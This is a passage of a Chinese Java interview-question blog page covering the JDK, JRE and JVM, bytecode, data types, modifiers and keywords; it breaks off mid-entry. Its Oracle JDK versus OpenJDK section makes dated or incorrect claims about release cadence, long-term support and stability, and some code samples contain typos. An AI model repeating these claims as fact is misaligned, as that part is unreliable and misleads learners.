Enterprise Edition，企业版） </span><br><span class="line">• Java EE 以前称为 J2EE。企业版本帮助开发和部署可移植、健壮、可伸缩且安全的服务器端Java 应用程序。</span><br><span class="line">• Java EE 是在 Java SE 的基础上构建的，它提供 Web 服务、组件模型、管理和通信 API，可以用来实现企业级的面向服务体系结构和 Web2.0 应用程序。</span><br><span class="line">• 2018 年 2 月，Eclipse 宣布正式将 JavaEE 更名为JakartaEE </span><br><span class="line"></span><br><span class="line">3. Java ME（J2ME，Java 2 Platform Micro Edition，微型版） </span><br><span class="line">• Java ME 以前称为 J2ME。Java ME 为在移动设备和嵌入式设备（比如手 机、PDA、电视机顶盒和打印机）上运行的应用程序提供一个健壮且灵活的环境。</span><br><span class="line">• Java ME 包括灵活的用户界面、健壮的安全模型、许多内置的网络协议以及对可以动态下载的连网和离线应用程序的丰富支持。</span><br><span class="line">• 基于 Java ME 规范的应用程序只需编写一次，就可以用于许多设备，而且可以利用每个设备的本机功能。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4、JVM、JRE-和-JDK-的关系"><a href="#4、JVM、JRE-和-JDK-的关系" class="headerlink" title="4、JVM、JRE 和 JDK 的关系"></a>4、JVM、JRE 和 JDK 的关系</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. JVM</span><br><span class="line">Java Virtual Machine 是 Java 虚拟机，Java 程序需要运行在虚拟机上，不同的 平台有自己的虚拟机，因此 Java 语言可以实现跨平台。 </span><br><span class="line"></span><br><span class="line">2. JRE </span><br><span class="line"> Java Runtime Environment 包括 Java 虚拟机和 Java 程序所需的核心类库等。核心类库主要是 java.lang 包：包含了运行 Java 程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包 如果想要运行一个开发好的 Java 程序，计算机中只需要安装 JRE 即可。 </span><br><span class="line"></span><br><span class="line">3. JDK </span><br><span class="line"> JavaDevelopmentKit是提供给 Java 开发人员使用的，其中包含了 Java 的开发工具，也包括了 JRE。所以安装了 JDK，就无需再单独安装JRE 了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等 </span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/63b99434be43e0d30e9a12dd.jpg" alt="image-20230105200611777"></p><h2 id="5、什么是跨平台性？原理是什么"><a href="#5、什么是跨平台性？原理是什么" class="headerlink" title="5、什么是跨平台性？原理是什么"></a>5、什么是跨平台性？原理是什么</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 所谓跨平台性，是指 java 语言编写的程序，一次编译后，可以在多个系统平台 上运行。 </span><br><span class="line"></span><br><span class="line">2. 实现原理：Java 程序是通过 java 虚拟机在系统平台上运行的，只要该系统可以 安装相应的 java 虚拟机，该系统就可以运行 java 程序。</span><br></pre></td></tr></table></figure><h2 id="6、Java-语言有哪些特点"><a href="#6、Java-语言有哪些特点" class="headerlink" title="6、Java 语言有哪些特点"></a>6、Java 语言有哪些特点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 简单易学（Java 语言的语法与C语言和 C++语言很接近） </span><br><span class="line"></span><br><span class="line">2. 面向对象（封装，继承，多态） </span><br><span class="line"></span><br><span class="line">3. 平台无关性（Java虚拟机实现平台无关性） </span><br><span class="line"></span><br><span class="line">4. 支持网络编程并且很方便（Java语言诞生本身就是为简化网络编程设计的） 支持多线程（多线程机制使应用程序在同一时间并行执行多项任） </span><br><span class="line"> </span><br><span class="line">5.健壮性（Java 语言的强类型机制、异常处理、垃圾的自动收集等） 安全性</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7、什么是字节码？采用字节码的最大好处是什么"><a href="#7、什么是字节码？采用字节码的最大好处是什么" class="headerlink" title="7、什么是字节码？采用字节码的最大好处是什么"></a>7、什么是字节码？采用字节码的最大好处是什么</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. 字节码：Java 源代码经过虚拟机编译器编译后产生的文件（即扩展为.class 的 文件），它不面向任何特定的处理器，只面向虚拟机。 </span><br><span class="line"></span><br><span class="line">2. 采用字节码的好处： </span><br><span class="line">• Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的 问题，同时又保留了解释型语言可移植的特点。</span><br><span class="line">• 所以 Java 程序运行时比较高效，而且，由于字节码并不专对一种特定的机器，因此，Java 程序无须重新编译 便可在多种不同的计算机上运行。 </span><br><span class="line"></span><br><span class="line">3. 先看下 java 中的编译器和解释器： </span><br><span class="line">• Java 中引入了虚拟机的概念，即在机器和编译程序之间加入了一层抽象的虚拟机 器。这台虚拟的机器在任何平台上都提供给编译程序一个的共同的接口。</span><br><span class="line">• 编译程序只需要面向虚拟机，生成虚拟机能够理解的代码，然后由解释器来将虚拟机代 码转换为特定系统的机器码执行。</span><br><span class="line">• 在Java中，这种供虚拟机理解的代码叫做字节码（即扩展为.class的文件），它不面向任何特定的处理器，只面向虚拟机。</span><br><span class="line">• 每一种平台的解释器是不同的，但是实现的虚拟机是相同的。</span><br><span class="line">• Java源程序经过编译器编译后变成字节码，字节码由虚拟机解释执行，虚拟机将每一条要执行的字节码送给解释器，解释器将其翻译成特定机器上的机器码。</span><br><span class="line">• 然后在特定的机器上运行，这就是上面提到的Java的特点的编译与解释并存的解释。 </span><br><span class="line"></span><br><span class="line">4. Java 源代码----&gt;编译器----&gt;jvm 可执行的 Java 字节码(即虚拟指令)----&gt;jvm----&gt;jvm 中解释器-----&gt;机器可执行的二进制机器码----&gt;程序运行。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8、什么是-Java-程序的主类？应用程序和小程序的主类有何不同？"><a href="#8、什么是-Java-程序的主类？应用程序和小程序的主类有何不同？" class="headerlink" title="8、什么是 Java 程序的主类？应用程序和小程序的主类有何不同？"></a>8、什么是 Java 程序的主类？应用程序和小程序的主类有何不同？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 一个程序中可以有多个类，但只能有一个类是主类。在 Java 应用程序中，这个主类是指包含 main()方法的类。</span><br><span class="line"></span><br><span class="line">2. 而在Java小程序中，这个主类是一个继承自系 统类 JApplet 或 Applet 的子类。应用程序的主类不一定要求是 public 类，但小程序的主类要求必须是public 类。</span><br><span class="line">主类是 Java 程序执行的入口点。 </span><br></pre></td></tr></table></figure><h2 id="9、Java-应用程序与小程序之间有那些差别？"><a href="#9、Java-应用程序与小程序之间有那些差别？" class="headerlink" title="9、Java 应用程序与小程序之间有那些差别？"></a>9、Java 应用程序与小程序之间有那些差别？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 简单说应用程序是从主线程启动(也就是 main()方法)。</span><br><span class="line"></span><br><span class="line">2. applet 小程序没有 main 方法，主要是嵌在浏览器页面上运行(调用 init()线程或者 run()来启动)，嵌入浏览器这点跟 flash 的小游戏类似。 </span><br></pre></td></tr></table></figure><h2 id="10、Java-和-C-的区别"><a href="#10、Java-和-C-的区别" class="headerlink" title="10、Java 和 C++的区别"></a>10、Java 和 C++的区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 都是面向对象的语言，都支持封装、继承和多态 </span><br><span class="line">2. Java 不提供指针来直接访问内存，程序内存更加安全 </span><br><span class="line">3. Java 的类是单继承的，C++支持多重继承；虽然 Java 的类不可以多继承，但是接口可以多继承。 </span><br><span class="line">5. Java 有自动内存管理机制，不需要程序员手动释放无用内存 </span><br></pre></td></tr></table></figure><h2 id="11、Oracle-JDK-和-OpenJDK-的对比"><a href="#11、Oracle-JDK-和-OpenJDK-的对比" class="headerlink" title="11、Oracle JDK 和 OpenJDK 的对比"></a>11、Oracle JDK 和 OpenJDK 的对比</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.OracleJDK 版本将每三年发布一次，而 OpenJDK 版本每三个月发布一次；</span><br><span class="line"></span><br><span class="line">2.OpenJDK是一个参考模型并且是完全开源的，而OracleJDK 是OpenJDK的一个实现，并不是完全开源的； </span><br><span class="line"></span><br><span class="line">3.• OracleJDK 比 OpenJDK更稳定。OpenJDK 和 OracleJDK的代码几乎相同，但 OracleJDK有更多的类和一些错误修复。</span><br><span class="line">• 因此，如果想开发企业/商业软件，建议选择OracleJDK，因为它经过了彻底的测试和稳定。</span><br><span class="line">• 某些情况下，有些人提到在使用 OpenJDK可能会遇到了许多应用程序崩溃的问题，但是只需切换到 OracleJDK就可以解决问题； </span><br><span class="line"></span><br><span class="line">4.在响应性和JVM性能方面，OracleJDK 与 OpenJDK 相比提供了更好的性能； </span><br><span class="line"></span><br><span class="line">5.OracleJDK不会为即将发布的版本提供长期支持，用户每次都必须通过更新到最新版本获得支持来获取最新版本； </span><br><span class="line"></span><br><span class="line">6.OracleJDK根据二进制代码许可协议获得许可，而OpenJDK根 GPLv2许可获得许可。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="gt-基础语法"><a href="#gt-基础语法" class="headerlink" title="&gt; 基础语法"></a>&gt; 基础语法</h1><h2 id="1、数据类型"><a href="#1、数据类型" class="headerlink" title="1、数据类型"></a>1、数据类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Java 有哪些数据类型</span><br><span class="line">定义：Java 语言是强类型语言，对于每一种数据都定义了明确的具体的数据类型，在内存中分配了不同大小的内存空间。</span><br><span class="line"></span><br><span class="line">分类</span><br><span class="line">• 基本数据类型</span><br><span class="line">o 数值型</span><br><span class="line">▪ 整数类型(byte,short,int,long)</span><br><span class="line">▪ 浮点类型(float,double)</span><br><span class="line">o 字符型(char)</span><br><span class="line">o 布尔型(boolean)</span><br><span class="line">• 引用数据类型</span><br><span class="line">o 类(class)</span><br><span class="line">o 接口(interface)</span><br><span class="line">o 数组([])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Java 基本数据类型图</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/63b99463be43e0d30e9a643b.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A. switch 是否能作用在 byte 上，是否能作用在 long 上，是否能作用在String 上</span><br><span class="line">• 在 Java 5 以前，switch(expr)中，expr 只能是 byte、short、char、int。从Java5 开始，Java 中引入了枚举类型，expr 也可以是 enum 类型</span><br><span class="line">• 从Java7 开始，expr 还可以是字符串（String），但是长整型（long）在目前所有的版本中都是不可以的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">B. 用最有效率的方法计算2乘以8 ?</span><br><span class="line">• 2 &lt;&lt; 3（左移 3 位相当于乘以 2 的 3 次方，右移 3 位相当于除以 2 的 3 次方）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C. Math.round(11.5) 等于多少？Math.round(-11.5)等于多少?</span><br><span class="line">• Math.round(11.5)的返回值是 12，Math.round(-11.5)的返回值是-11。四舍五入的原理是在参数上加 0.5 然后进行下取整。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D. float f=3.4;是否正确?</span><br><span class="line">• 不正确。3.4 是双精度数，将双精度型（double）赋值给浮点型（float）属于下转型（down-casting，也称为窄化）会造成精度损失</span><br><span class="line">• 因此需要强制类型转换float f =(float)3.4; 或者写成 float f =3.4F;。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E. short s1 = 1; s1 = s1 + 1;有错吗?short s1 = 1; s1 += 1;有错吗?</span><br><span class="line">• 对于 short s1 = 1; s1 = s1 + 1;由于 1 是 int 类型，因此 s1+1 运算结果也是 int 型，需要强制转换类型才能赋值给 short 型</span><br><span class="line">• 而 short s1 = 1; s1 += 1;可以正确编译，因为 s1+= 1;相当于 s1 =(short(s1 + 1);其中有隐含的强制类型转换</span><br></pre></td></tr></table></figure><h2 id="2、编码"><a href="#2、编码" class="headerlink" title="2、编码"></a>2、编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Java 语言采用何种编码方案？有何特点？</span><br><span class="line">Java 语言采用 Unicode 编码标准，Unicode（标准码），它为每个字符制订了一个唯一的数值，因此在任何的语言，平台，程序都可以放心的使用。</span><br></pre></td></tr></table></figure><h2 id="3、注释"><a href="#3、注释" class="headerlink" title="3、注释"></a>3、注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">什么是 Java 注释?</span><br><span class="line">定义：用于解释说明程序的文字</span><br><span class="line"></span><br><span class="line">分类</span><br><span class="line">• 单行注释</span><br><span class="line">格式： // 注释文字</span><br><span class="line">• 多行注释</span><br><span class="line">格式： /* 注释文字 */</span><br><span class="line">• 文档注释</span><br><span class="line">格式：/** 注释文字 */</span><br><span class="line"></span><br><span class="line">作用</span><br><span class="line">在程序中，尤其是复杂的程序中，适当地加入注释可以增加程序的可读性，有利于程序的修改、调试和交流。注释的内容在程序编译的时候会被忽视，不会产生目标代码，注释的部分不会对程序的执行结果产生任何影响。</span><br><span class="line"></span><br><span class="line">注意事项：多行和文档注释都不能嵌套使用。</span><br></pre></td></tr></table></figure><h2 id="4、访问修饰符"><a href="#4、访问修饰符" class="headerlink" title="4、访问修饰符"></a>4、访问修饰符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">访问修饰符 public,private,protected,以及不写（默认）时的区别</span><br><span class="line">定义: Java 中，可以使用访问修饰符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。</span><br><span class="line"></span><br><span class="line">分类:</span><br><span class="line">private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类）</span><br><span class="line"></span><br><span class="line">default (即缺省，什么也不写，不使用任何关键字）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。</span><br><span class="line"></span><br><span class="line">protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。</span><br><span class="line"></span><br><span class="line">public : 对所有类可见。使用对象：类、接口、变量、方法</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/63b99484be43e0d30e9a9dd1.jpg" alt="image-20230105202532968"></p><h2 id="5、运算符"><a href="#5、运算符" class="headerlink" title="5、运算符"></a>5、运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">逻辑与运算符（&amp;）   短路与运算符（&amp;&amp;）</span><br><span class="line">二者都要求运算符左右两端的布尔值都是 true 整个表达式的值才是 true。&amp;&amp;是因为如果左边的表达式的值是 false，右边会被直接短路掉，不会运算。结果为false。</span><br><span class="line"></span><br><span class="line">逻辑或运算符（|）   短路或运算符（||）</span><br><span class="line">二者只要运算符有一边的布尔值是 true 整个表达式的值就为 true。||是因为如果左边的表达式的值是 true，右边会被直接短路掉，不会运算。结果为true。</span><br></pre></td></tr></table></figure><h2 id="6、关键字"><a href="#6、关键字" class="headerlink" title="6、关键字"></a>6、关键字</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">A. Java 有没有 goto? </span><br><span class="line">• goto 是 Java 中的保留字，在目前版本的 Java 中没有使用。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">B. <span class="keyword">final</span> 有什么用？</span><br><span class="line">用于修饰类、属性和方法；</span><br><span class="line">• 被 <span class="keyword">final</span> 修饰的类不可以被继承</span><br><span class="line">• 被 <span class="keyword">final</span> 修饰的方法不可以被重写</span><br><span class="line">• 被 <span class="keyword">final</span> 修饰的变量不可以被改变，被 <span class="keyword">final</span> 修饰不可变的是变量的引用，而不是引用指向的内容，引用指向的内容是可以改变的</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">C. <span class="keyword">final</span> <span class="keyword">finally</span> finalize 区别 ?</span><br><span class="line">• <span class="keyword">final</span> 可以修饰类、变量、方法，修饰类表示该类不能被继承、修饰方法表示该方法不能被重写、修饰变量表示该变量是一个常量不能被重新赋值。</span><br><span class="line">• <span class="keyword">finally</span> 一般作用在 <span class="keyword">try</span>-<span class="keyword">catch</span> 代码块中，在处理异常的时候，通常我们将一定要执行的代码方法 <span class="keyword">finally</span> 代码块中，</span><br><span class="line">    • 表示不管是否出现异常，该代码块都会执行，一般用来存放一些关闭资源的代码。</span><br><span class="line">• finalize 是一个方法，属于 Object 类的一个方法，而 Object 类是所有类的父类，该方法一般由垃圾回收器来调用，</span><br><span class="line">    • 当我们调用 System.gc() 方法的时候，由垃圾回收器调用finalize()，回收垃圾，一个对象是否可回收的最后判断。</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">D. <span class="keyword">this</span> 关键字的用法?</span><br><span class="line">• <span class="keyword">this</span> 是自身的一个对象，代表对象本身，可以理解为：指向对象本身的一个指针。</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">E. <span class="keyword">this</span> 的用法在 java 中大体可以分为 <span class="number">3</span> 种：</span><br><span class="line">• 普通的直接引用，<span class="keyword">this</span> 相当于是指向当前对象本身。</span><br><span class="line">            </span><br><span class="line">• 形参与成员名字重名，用 <span class="keyword">this</span> 来区分：</span><br><span class="line">            </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">• 引用本类的构造函数</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> String name;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.name = name;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>(name);</span><br><span class="line">                <span class="keyword">this</span>.age = age;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F. <span class="keyword">super</span> 关键字的用法</span><br><span class="line">    • <span class="keyword">super</span> 可以理解为是指向自己超（父）类对象的一个指针，而这个超类指的是离自己最近的一个父类。</span><br><span class="line">    </span><br><span class="line">• <span class="keyword">super</span> 也有三种用法：</span><br><span class="line"><span class="number">1.</span>普通的直接引用与 <span class="keyword">this</span> 类似，<span class="keyword">super</span> 相当于是指向当前对象的父类的引用，这样就可以用<span class="keyword">super</span>.xxx 来引用父类的成员。</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>子类中的成员变量或方法与父类中的成员变量或方法同名时，用 <span class="keyword">super</span> 进行区分</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> String name;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.name = name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Studentextends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, String name1)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>(name);</span><br><span class="line">                <span class="keyword">this</span>.name = name1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="keyword">this</span>.name);      <span class="comment">//Child</span></span><br><span class="line">                System.out.println(<span class="keyword">super</span>.name);     <span class="comment">//Father</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">                Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;Father&quot;</span>, <span class="string">&quot;Child&quot;</span>);</span><br><span class="line">                s1.getInfo();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">• 引用父类构造函数</span><br><span class="line"><span class="number">1</span>、<span class="keyword">super</span>（参数）：调用父类中的某一个构造函数（应该为构造函数中的第一条语句）。</span><br><span class="line"><span class="number">2</span>、<span class="keyword">this</span>（参数）：调用本类中另一种形式的构造函数（应该为构造函数中的第一条语句。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">G. <span class="keyword">this</span> 与 <span class="keyword">super</span> 的区别</span><br><span class="line">• <span class="keyword">super</span>: 它引用当前对象的直接父类中的成员（用来访问直接父类中被隐藏的父类中成员数据或函数，基类与派生类中有相同成员定义时如：<span class="keyword">super</span>.变量名<span class="keyword">super</span>.成员函数据名（实参）</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">this</span>：它代表当前对象名（在程序中易产生二义性之处，应使用 <span class="keyword">this</span> 来指明当前对象；如果函数的形参与类中的成员数据同名，这时需用 <span class="keyword">this</span>来指明成员变量名）</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">super</span>()和 <span class="keyword">this</span>()类似,区别是，<span class="keyword">super</span>()在子类中调用父类的构造方法，<span class="keyword">this</span>()在本类内调用本类的其它构造方法。</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">super</span>()和 <span class="keyword">this</span>()均需放在构造方法内第一行。</span><br><span class="line">                </span><br><span class="line">• 尽管可以用 <span class="keyword">this</span> 调用一个构造器，但却不能调用两个。</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">this</span> 和 <span class="keyword">super</span> 不能同时出现在一个构造函数里面，因为 <span class="keyword">this</span> 必然会调用其它的构造函数，其它的构造函数必然也会有 <span class="keyword">super</span> 语句的存在，所以在同一个构造函数里面有相同的语句，就失去了语句的意义，编译器也不会通过。</span><br><span class="line">                </span><br><span class="line">• <span class="keyword">this</span>()和 <span class="keyword">super</span>()都指的是对象，所以，均不可以在 <span class="keyword">static</span> 环境中使用。包括：<span class="keyword">static</span> 变量,<span class="keyword">static</span> 方法，<span class="keyword">static</span>语句块。</span><br><span class="line">                </span><br><span class="line">• 从本质上讲，<span class="keyword">this</span> 是一个指向本对象的指针, 然而 <span class="keyword">super</span> 是一个 Java 关键字。</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">H. <span class="keyword">static</span> 存在的主要意义</span><br><span class="line">• <span class="keyword">static</span> 